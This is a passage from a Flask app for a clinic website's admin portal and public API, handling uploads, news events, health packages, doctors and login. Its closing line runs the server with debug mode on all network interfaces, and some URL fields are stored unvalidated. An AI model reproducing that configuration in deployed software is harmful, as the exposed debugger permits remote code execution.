    uploaded_file = request.files.get('site_note_image') or request.files.get('note_image')
    image_url = _save_site_note_image(uploaded_file) if uploaded_file and uploaded_file.filename else None
    if not image_url:
        return redirect(url_for('portal_add_notes'))

    raw_display_days = (request.form.get('display_days') or '').strip()
    try:
        display_days = int(raw_display_days) if raw_display_days else 0
    except ValueError:
        display_days = 0
    if display_days < 0:
        display_days = 0

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        'INSERT INTO site_notes (image_url, display_days) VALUES (?, ?)',
        (image_url, display_days)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_notes'))


@app.post('/portal/news-and-event/note/<int:note_id>/delete')
@app.post('/portal/news-and-events/note/<int:note_id>/delete')
def portal_delete_site_note(note_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    row = conn.execute('SELECT image_url FROM site_notes WHERE id = ?', (note_id,)).fetchone()
    if row and row['image_url']:
        relative_path = row['image_url'].replace('/image/', '', 1)
        full_path = os.path.join(app.root_path, 'image', relative_path)
        if os.path.exists(full_path):
            os.remove(full_path)
    conn.execute('DELETE FROM site_notes WHERE id = ?', (note_id,))
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_notes'))


@app.post('/portal/news-and-event/video')
@app.post('/portal/news-and-events/video')
def portal_news_events_video_submit():
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    files = request.files.getlist('video_uploads')
    saved_videos = []
    for uploaded_file in files[:10]:
        if not uploaded_file or not uploaded_file.filename:
            continue
        saved_url = _save_news_event_video(uploaded_file)
        if saved_url:
            saved_videos.append(saved_url)

    link_values = request.form.getlist('facebook_video_links')
    valid_links = []
    seen = set()
    for raw in link_values[:10]:
        cleaned = (raw or '').strip()
        if not cleaned or cleaned in seen:
            continue
        seen.add(cleaned)
        valid_links.append(cleaned)

    if not saved_videos and not valid_links:
        return redirect(url_for('portal_news_events'))

    title_prefix = (request.form.get('video_title') or '').strip() or 'Video'
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    next_order = conn.execute('SELECT COALESCE(MAX(sort_order), 0) FROM news_events').fetchone()[0] + 1
    for index, saved_url in enumerate(saved_videos[:10], start=1):
        conn.execute(
            '''
            INSERT INTO news_events (title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header, is_active, sort_order)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''',
            (f"{title_prefix} {index}", '', None, saved_url, 'Video', None, None, None, None, 1, next_order)
        )
        next_order += 1

    for index, link in enumerate(valid_links[:10], start=1):
        conn.execute(
            '''
            INSERT INTO news_events (title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header, is_active, sort_order)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''',
            (f"{title_prefix} Link {index}", '', None, link, 'Video', None, None, None, None, 1, next_order)
        )
        next_order += 1

    conn.commit()
    conn.close()
    return redirect(url_for('portal_news_events'))


@app.get('/portal/news-and-event/<int:event_id>/edit')
@app.get('/portal/news-and-events/<int:event_id>/edit')
def portal_news_event_edit(event_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    event = conn.execute(
        '''
        SELECT id, title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header
        FROM news_events WHERE id = ?
        ''',
        (event_id,)
    ).fetchone()
    conn.close()

    if not event:
        return redirect(url_for('portal_news_events'))

    event_data = dict(event)
    event_data['event_date'] = _parse_event_date_to_iso(event_data.get('event_date')) or event_data.get('event_date') or ''

    return render_template(
        'portal_news_event_edit.html',
        username=session.get('username', 'vinayak'),
        event=event_data,
    )


@app.post('/portal/news-and-event/<int:event_id>/edit')
@app.post('/portal/news-and-events/<int:event_id>/edit')
def portal_news_event_update(event_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    gallery_header = (request.form.get('gallery_header') or '').strip()
    title = (request.form.get('title') or gallery_header).strip()
    description = (request.form.get('description') or '').strip()
    video_url = (request.form.get('video_url') or '').strip()
    event_type = (request.form.get('event_type') or '').strip()
    event_date = _normalize_event_date_for_storage((request.form.get('event_date') or '').strip())
    event_time = (request.form.get('event_time') or '').strip()
    location = (request.form.get('location') or '').strip()
    uploaded_file = request.files.get('gallery_image') or request.files.get('image')

    if not title and not uploaded_file:
        return redirect(url_for('portal_news_event_edit', event_id=event_id))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    current = conn.execute(
        'SELECT image_url FROM news_events WHERE id = ?',
        (event_id,)
    ).fetchone()

    image_url = current['image_url'] if current else None
    if uploaded_file and uploaded_file.filename:
        new_image_url = _save_news_event_image(uploaded_file)
        if new_image_url:
            if image_url:
                relative_path = image_url.replace('/image/', '', 1)
                full_path = os.path.join(app.root_path, 'image', relative_path)
                if os.path.exists(full_path):
                    os.remove(full_path)
            image_url = new_image_url

    conn.execute(
        '''
        UPDATE news_events
        SET title = ?, description = ?, image_url = ?, video_url = ?, event_type = ?, event_date = ?, event_time = ?, location = ?, gallery_header = ?
        WHERE id = ?
        ''',
        (title or gallery_header or 'News & Event', description or None, image_url, video_url or None, event_type or None, event_date or None, event_time or None, location or None, gallery_header or None, event_id)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_news_events'))


@app.post('/portal/news-and-event/<int:event_id>/delete')
@app.post('/portal/news-and-events/<int:event_id>/delete')
def portal_news_events_delete(event_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    row = conn.execute('SELECT image_url FROM news_events WHERE id = ?', (event_id,)).fetchone()
    if row and row['image_url']:
        relative_path = row['image_url'].replace('/image/', '', 1)
        full_path = os.path.join(app.root_path, 'image', relative_path)
        if os.path.exists(full_path):
            os.remove(full_path)
    conn.execute('DELETE FROM news_events WHERE id = ?', (event_id,))
    conn.commit()
    conn.close()
    return redirect(url_for('portal_news_events'))


@app.get('/api/services')
def api_services():
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    items = conn.execute(
        '''
        SELECT id, name, description, sort_order
        FROM services
        ORDER BY COALESCE(sort_order, 999999), id ASC
        '''
    ).fetchall()
    conn.close()
    payload = [dict(row) for row in items]
    return jsonify({"services": payload})


@app.get('/api/site-settings')
def api_site_settings():
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    row = conn.execute(
        'SELECT phone, email, location FROM site_settings WHERE id = 1'
    ).fetchone()
    conn.close()

    settings = {
        'phone': (row['phone'] if row and row['phone'] else ''),
        'email': (row['email'] if row and row['email'] else ''),
        'location': (row['location'] if row and row['location'] else ''),
    }
    return jsonify(settings)


@app.get('/api/news-events')
def api_news_events():
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    items = conn.execute(
        '''
        SELECT id, title, description, image_url, video_url, event_type, event_date, event_time, location, gallery_header, sort_order, created_at
        FROM news_events ORDER BY COALESCE(sort_order, 999999), created_at DESC
        '''
    ).fetchall()
    conn.close()
    payload = []
    for row in items:
        item = dict(row)
        item['gallery_header'] = item.get('gallery_header') or item.get('title') or None
        payload.append(item)
    return jsonify({"news_events": payload})


@app.post('/portal/news-and-event/<int:event_id>/status')
def portal_news_events_status(event_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    selected = request.form.get('is_active')
    is_active = 1 if selected not in ('0', 'false', 'False', 'inactive') else 0

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute('UPDATE news_events SET is_active = ? WHERE id = ?', (is_active, event_id))
    conn.commit()
    conn.close()
    return redirect(url_for('portal_news_events'))


@app.get('/portal/add-health-packages/<int:package_id>/edit')
def portal_edit_health_package(package_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    package = conn.execute(
        'SELECT id, name, price, description, tests FROM health_packages WHERE id = ?',
        (package_id,)
    ).fetchone()
    conn.close()

    if not package:
        return redirect(url_for('portal_add_health_packages'))

    package_data = dict(package)
    package_data['tests'] = json.loads(package_data['tests']) if isinstance(package_data['tests'], str) else package_data['tests']

    return render_template(
        'portal_health_package_edit.html',
        username=session.get('username', 'vinayak'),
        package=package_data,
    )


@app.post('/portal/add-health-packages/<int:package_id>/edit')
def portal_update_health_package(package_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    price = (request.form.get('price') or '').strip()
    description = (request.form.get('description') or '').strip()
    raw_tests = request.form.getlist('tests')
    tests = []
    for value in raw_tests:
        cleaned = (value or '').strip()
        if cleaned:
            tests.append(cleaned)

    if not name or not price:
        return redirect(url_for('portal_edit_health_package', package_id=package_id))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        '''
        UPDATE health_packages
        SET name = ?, price = ?, description = ?, tests = ?
        WHERE id = ?
        ''',
        (name, price, description, json.dumps(tests), package_id)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_health_packages'))


@app.post('/portal/add-health-packages/<int:package_id>/delete')
def portal_delete_health_package(package_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute('DELETE FROM health_packages WHERE id = ?', (package_id,))
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_health_packages'))


@app.post('/portal/add-health-packages/reorder')
def portal_reorder_health_packages():
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401

    data = request.get_json(silent=True) or {}
    package_ids = data.get('package_ids') or []
    if not isinstance(package_ids, list):
        return jsonify({'error': 'Invalid payload'}), 400

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    for index, package_id in enumerate(package_ids, start=1):
        conn.execute(
            'UPDATE health_packages SET sort_order = ? WHERE id = ?',
            (index, package_id)
        )
    conn.commit()
    conn.close()
    return jsonify({'status': 'ok'})


@app.get('/portal/add-doctors/<int:doctor_id>/edit')
def portal_edit_doctor(doctor_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    doctor = conn.execute(
        'SELECT id, name, specialty, experience, bio FROM doctors WHERE id = ?',
        (doctor_id,)
    ).fetchone()
    departments = conn.execute(
        'SELECT name FROM departments ORDER BY name COLLATE NOCASE ASC'
    ).fetchall()
    conn.close()

    if not doctor:
        return redirect(url_for('portal_add_doctors'))

    doctor_data = dict(doctor)
    doctor_data['image_url'] = DOCTOR_IMAGE_BY_NAME.get((doctor_data['name'] or '').strip().lower(), '/image/fav-icon.png')

    return render_template(
        'portal_doctor_edit.html',
        username=session.get('username', 'vinayak'),
        doctor=doctor_data,
        departments=[row['name'] for row in departments],
    )


@app.post('/portal/add-doctors/<int:doctor_id>/edit')
def portal_update_doctor(doctor_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    name = (request.form.get('name') or '').strip()
    specialty = (request.form.get('specialty') or '').strip()
    department = (request.form.get('department') or '').strip()
    bio = (request.form.get('bio') or '').strip()
    image_url = (request.form.get('image_url') or '').strip()

    if not name or not department:
        return redirect(url_for('portal_edit_doctor', doctor_id=doctor_id))

    normalized_name = name.lower()
    if image_url:
        DOCTOR_IMAGE_BY_NAME[normalized_name] = image_url

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute(
        '''
        UPDATE doctors
        SET name = ?, specialty = ?, experience = ?, bio = ?
        WHERE id = ?
        ''',
        (name, department, specialty, bio, doctor_id)
    )
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_doctors'))


@app.post('/portal/add-doctors/<int:doctor_id>/delete')
def portal_delete_doctor(doctor_id):
    if not session.get('logged_in'):
        return redirect(url_for('portal_login_page'))

    conn = get_connection(app.config['SQLITE_DB_PATH'])
    conn.execute('DELETE FROM doctors WHERE id = ?', (doctor_id,))
    conn.commit()
    conn.close()
    return redirect(url_for('portal_add_doctors'))


@app.get('/portal/login')
def portal_login_page():
    if session.get('logged_in'):
        return redirect(url_for('portal_home'))
    return render_template('portal_login.html', error=None)


@app.post('/portal/login')
def portal_login_submit():
    username = (request.form.get('username') or '').strip()
    password = request.form.get('password') or ''

    user = get_portal_user(username, app.config['SQLITE_DB_PATH'])
    if not user or not check_password_hash(user['password_hash'], password):
        return render_template('portal_login.html', error='Invalid username or password.'), 401

    session['logged_in'] = True
    session['username'] = user['username']
    session['full_name'] = user['full_name'] or user['username']
    return redirect(url_for('portal_home'))


@app.get('/portal/logout')
def portal_logout():
    session.clear()
    return redirect(url_for('portal_login_page'))


@app.get('/api/site-notes')
def api_site_notes():
    conn = get_connection(app.config['SQLITE_DB_PATH'])
    notes = conn.execute(
        'SELECT id, image_url, display_days, created_at FROM site_notes ORDER BY created_at DESC, id DESC'
    ).fetchall()
    conn.close()
    payload = [dict(note) for note in notes]
    return jsonify({"notes": payload})


@app.get('/api/health-packages')
def api_health_packages():
    packages = get_health_packages(app.config['SQLITE_DB_PATH'])
    return jsonify({"packages": packages})


@app.post('/api/auth/login')
def api_login():
    data = request.get_json(silent=True) or {}
    username = (data.get('username') or '').strip()
    password = data.get('password') or ''

    user = get_portal_user(username, app.config['SQLITE_DB_PATH'])
    if not user or not check_password_hash(user['password_hash'], password):
        return jsonify({"success": False, "message": "Invalid username or password."}), 401

    session['logged_in'] = True
    session['username'] = user['username']
    session['full_name'] = user['full_name'] or user['username']
    return jsonify({"success": True, "message": "Login successful.", "username": user['username']})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
